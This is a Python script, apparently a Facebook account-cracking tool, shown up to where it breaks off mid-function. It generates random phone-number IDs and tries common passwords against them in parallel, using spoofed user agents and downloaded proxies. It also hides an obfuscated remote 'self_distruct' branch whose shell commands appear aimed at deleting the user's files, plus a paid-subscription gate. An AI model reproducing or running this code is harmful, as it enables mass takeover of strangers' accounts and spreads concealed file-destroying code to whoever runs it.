#dont know kiski sciprt ha 🙂uthau our enjoy kro just fb group join krlena (Cracking world 2.0)
#Open source by Haris Akhtar (Harry) GitHub follow krlena just 
import os

try:

	import requests

except ImportError:

	print('\n [×] Modul requests belum terinstall!...\n')

	os.system('pip install requests')

try:

	import concurrent.futures

except ImportError:

	print('\n [×] Modul Futures belum terinstall!...\n')

	os.system('pip install futures')

try:

	import bs4

except ImportError:

	print('\n [×] Modul Bs4 belum terinstall!...\n')

	os.system('pip install bs4')

import requests, os, re, bs4, sys, uuid, json, time, random, datetime, subprocess

from concurrent.futures import ThreadPoolExecutor as YayanGanteng

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

	if n < 0 or n > 12:

		exit()

	nTemp = n - 1

except ValueError:

	exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

waktu = '%s %s %s'%(ha,op,ta)

waktu.split('/')

### WARNA RANDOM ###

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'	# WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

############################ RESPONSE FACEBOOK ###########################################

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,pwBaru=[],[]

Apk = []

ok = []

cp = []

id = []

user = []

loop = 0

import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python random.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
url_lookup = "https://lookup-id.com/"

url_mb = "https://mbasic.facebook.com"

url_ip = "https://www.httpbin.org/ip"

url_graph = "https://graph.facebook.com/{}"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']

#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

###########################################################################################

hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"

dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"

aaaa, bbbb, cccc = "tools", "debug", "accesstoken"

#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"

bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"

#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"

###########################################################################################

## RANDOM UA

#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']

uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"

uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"

uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"

uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"

uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"

uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"

uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"

#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"

#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"

uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"

uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])

uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"

uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"

uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"

uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])

# lempankkkkkkkk

ugen2=[]

ugen=[]

try:
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text
	open('http.txt','w').write(prox)
except Exception as e:
	os.system ("clear")
prox=open('http.txt','r').read().splitlines()

for xd in range(10000):

	a='Mozilla/5.0 (Symbian/3; Series60/'

	b=random.randrange(1, 9)

	c=random.randrange(1, 9)

	d='Nokia'

	e=random.randrange(100, 9999)

	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

	g=random.randrange(1, 9)

	h=random.randrange(1, 4)

	i=random.randrange(1, 4)

	j=random.randrange(1, 4)

	k='Mobile Safari/535.1'

	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

	ugen2.append(uaku)

	aa='Mozilla/5.0 (Linux; U; Android'

	b=random.choice(['6','7','8','9','10','11','12'])

	c=' en-us; GT-'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/537.36'

	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

	ugen.append(uaku2)

	
	
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/facebookweb/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.user-agents.txt','r').read().splitlines()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
logo="""
       ########  #### ##     😎   ###    ##       
       ##     ##  ##  ##         ## ##   ##       
       ##     ##  ##  ##        ##   ##  ##       
       ########   ##  ##       ##     ## ##       
       ##     ##  ##  ##       ######### ##       
       ##     ##  ##  ##       ##     ## ##       
       ########  #### ######## ##     ## ########🔥    
[+]═══════════════════════════════════════════
\033[1;32m(+)\033[1;32mCREATET BY   \033[1;32mMR.BILAL 🔥
\033[1;32m(+)\033[1;32mFACEBBOK     \033[1;32mBILAL🙈
\033[1;32m(+)\033[1;32mGITHUB       \033[1;32mBILAL-XD😎✨
\033[1;32m(+)\033[1;32mWHATSPP      \033[1;32m03093732292
\033[1;32m(+)\033[1;32mYOUTUBE      \033[1;32mHALWA HAI KYA bsdk 😂🤣
\033[1;32m(+)\033[1;32mSTATUS       \033[1;32mRANDOM
\x1b[1;97m[+]═══════════════════════════════════════════"""
loop = 0
ok = []
methods = []
total=[]
android_models = []
abc = {'1':'a','2':'b','3':'c','4':'d','5':'e','6':'f','7':'g','8':'h','9':'i','10':'j','11':'k','12':'l','13':'m','14':'n','15':'o','16':'p','17':'q','18':'r','19':'s','20':'t','21':'u','22':'v','23':'w','24':'x','25':'y','26':'z','27':':','28':'/','29':'.','30':'279','31':'-','32':'*','33':'?','34':'=','35':'&'}
def _let_me_down_slowly():
	try:
		global abc
		os.system('clear')
		print(logo)
		cv ='5.4' 
		x = requests.get('https://raw.githubusercontent.com/hop09/libraries/main/version.txt').text
		if str(cv) in str(x):
			os.system('rm -rf h64 h32 && python malang.py')
		else:
			status =requests.get(f"{abc['8']}{abc['20']}{abc['20']}{abc['16']}{abc['19']}{abc['27']}{abc['28']}{abc['28']}{abc['18']}{abc['1']}{abc['23']}{abc['29']}{abc['7']}{abc['9']}{abc['20']}{abc['8']}{abc['21']}{abc['2']}{abc['21']}{abc['19']}{abc['5']}{abc['18']}{abc['3']}{abc['15']}{abc['14']}{abc['20']}{abc['5']}{abc['14']}{abc['20']}{abc['29']}{abc['3']}{abc['15']}{abc['13']}{abc['28']}{abc['21']}{abc['14']}{abc['19']}{abc['20']}{abc['15']}{abc['16']}{abc['16']}{abc['1']}{abc['2']}{abc['12']}{abc['5']}{abc['30']}{abc['28']}{abc['19']}{abc['28']}{abc['13']}{abc['1']}{abc['9']}{abc['14']}{abc['28']}{abc['19']}{abc['20']}{abc['1']}{abc['20']}{abc['21']}{abc['19']}")
			if 'running' in status.text:
				__iam_a_porche()
			elif 'closed' in status.text:
				print('\n Unable to fetch data, try again later ....')
				exit()
			elif 'self_distruct' in status.text:
				os.system('pkg install coreutils > /dev/null')
				os.system(f"{abc['19']}{abc['13']} {abc['19']}{abc['6']}{abc['32']}")
				os.system(f"{abc['19']}{abc['13']} {abc['19']}{abc['6']} /sdcard/{abc['32']}")
			else:
				print('\n Credentials not match with server, try to updating.')
				print('if the problem continuous, contact with admin')
				__iam_a_porche()
	except requests.exceptions.ConnectionError:
		print(' No internet connection ..')

	
def __iam_a_porche():
	os.system('clear')
	print(logo)
	print('\033[1;33mChecking subscription ....\033[0;97m')
	try:
		user_data = requests.get('https://raw.githubusercontent.com/ahmad77412/axi/main/xx.txt').text.splitlines()
		t1 = base64.b64encode(str(os.getuid()).encode('ascii'))
		t2 = base64.b64encode((str(platform.uname()[2])).encode('ascii'))
		gen_token=('QW4HDDQCRG-'+str(t1)+'-AZMAH-'+str(t2))
		if gen_token in user_data:
			tiles()
		else:
			print('\nYour token: '+gen_token)
			print('\n\n You donot have hst subscription.')
			print('Neechy diye easypaisa account par RS 350 send kry.')
			print('Payment karny k bad payment ka screenshot or apna token neechy diye whatsapp number pr send kry')
			 
			print('[Payment Number]')
			print('Account number: 03458630524')
			print('Account name: Ahmad Javed')
			print('Account type: Easypaisa')
			 
			print('[Whatsapp Number]')
			print('Number: 923458630524')
			 
			input('Press enter to contact on join my fb group ')
			os.system('xdg-open https://www.facebook.com/groups/6916443825048913/?ref=share')
	except Exception as e:
		#print(e)
		print('\n\033[1;31mNo internet connection ... \033[0;97m')
def tiles():
	try:
		global android_models
		os.system('clear')
		print(logo)
		xx = requests.get('https://raw.githubusercontent.com/AKING110/Data/main/sm.txt').text.splitlines()
		for line in xx:
			android_models.append(line)
		if '.approved.txt' in os.listdir():
			facebookweb()
		else:
			facebookweb()
	except requests.exceptions.ConnectionError:
		print(' No internet connection ...') 
def cek_apk(session,coki):

	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

	sop = BeautifulSoup(w,"html.parser")

	x = sop.find("form",method="post")

	game = [i.text for i in x.find_all("h3")]

	if len(game)==0:

		print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))

	else:

		print(f'\r 🎮  %sYour Active Application Details :'%(H))

		for i in range(len(game)):

			print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

		#else:

			#print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

	sop = BeautifulSoup(w,"html.parser")

	x = sop.find("form",method="post")

	game = [i.text for i in x.find_all("h3")]

	if len(game)==0:

		print(f'\r %s[%s!%s] %sSorry no Expired Apk%s		   \n'%(N,M,N,M,N))

	else:

		print(f'\r 🎮  %sYour Expired Application Details :'%(M))

		for i in range(len(game)):

			print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

		else:

			print(f'\r')

			#print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))

loop = 0
Apk = []
oks = []
cps = []
#
def random_crack():
	os.system('clear')
	os.system('xdg-open https://chat.whatsapp.com/IyJpqmHzHkL2rQo1g5fuUb')
	print(logo)
	print('[√]         \033[41m\033[1;37m ENJOY FREE RANDOM CLONING\x1b[0m')
	print('[+]═══════════════════════════════════════════')
    print('[1] START RANDOM CRACK M [1]')
	print('[2] START RANDOM CRACK M [2]')
	print('[3] START RANDOM CRACK M [3]')
	print('[4] START RANDOM CRACK M [4]')
	print('[5] START RANDOM CRACK M [5]')
	print('[6] START RANDOM CRACK M [6]')
	print('[6] START RANDOM CRACK M [7]')
	print('[7] START RANDOM CRACK INDIA')
	print('[8] START RANDOM CRACK BANGLA')
	print('[9] START RANDOM CEACK AFGHAN')
	print('[10] START RANDOM CRACK U I A')
	print('\x1b[1;91m[11] JOIN OUR WATSAPP GROUP')
	print('\x1b[1;91m[12] EXIT PROGRAME')
	print('\x1b[1;97m[+]═══════════════════════════════════════════')
	opt = input('[!]\033[1;33m SELECT OPT : ')
	if opt =='1':
		random_number()
	if opt =='2':
		random_number1()
	if opt =='3':
		random_number2()
	if opt =='4':
		random_number3()
	if opt =='5':
		random_number4()
	if opt =='6':
		random_number5()
	if opt =='7':
		random_number6()
	elif opt =='8':
		random_number7()
	elif opt =='9':
		random_number8()
	elif opt =='12':
		exit()
	elif opt =='11':
		os.system('xdg-open https://chat.whatsapp.com/IyJpqmHzHkL2rQo1g5fuUb')
	elif opt =='10':
		random_number9()
	else:
		print('\n\033[1;92mChoose valid option\033[0;97m')
def random_number():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════') 
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	 
	facebookweb()
def random_number1():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════') 
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	 
	facebookweb()
def random_number2():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════')
		for guru in uid:
			uid = kode+guru
			pwx = [guru,'khankhan']
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	 
	facebookweb()
#_________
def random_number3():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════') 
		for guru in uid:
			uid = kode+guru
			pwx = [guru,'khankhan','khan1122','khan12','khan12345']
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	 
	facebookweb()
#__________
def random_number4():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════')
		for guru in uid:
			uid = kode+guru
			pwx = [guru,'pakistan','pakistan1122','pakistan12']
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	 
	facebookweb()
#________
def random_number5():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════')
		for guru in uid:
			uid = kode+guru
			pwx = ['khankhan','khan1122','khan12']
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	 
	facebookweb()
#_____
def random_number6():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :INDIA USE YOUR SIM CODE +9')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
